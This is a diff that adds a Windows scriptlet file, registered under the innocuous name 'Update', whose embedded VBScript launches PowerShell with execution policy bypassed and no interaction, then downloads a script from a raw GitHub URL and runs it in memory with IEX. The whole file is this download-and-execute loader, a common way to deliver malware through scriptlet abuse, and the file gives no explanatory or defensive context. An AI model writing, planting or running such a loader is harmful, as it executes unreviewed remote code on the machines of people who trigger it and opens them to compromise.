@@ -1,0 +1,13 @@
+<?XML version="1.0"?>
+<scriptlet>
+  <registration
+    progid="Update"
+    classid="{00000000-0000-0000-0000-000000000000}">
+    <script language="VBScript">
+      <![CDATA[
+        Set w = CreateObject("Wscript.Shell")
+        w.Run "%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe -exe Bypass -noni -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/flesschutz/PowerShell/refs/heads/main/scripts/cd-repo.ps1')"
+      ]]>
+    </script>
+  </registration>
+</scriptlet>
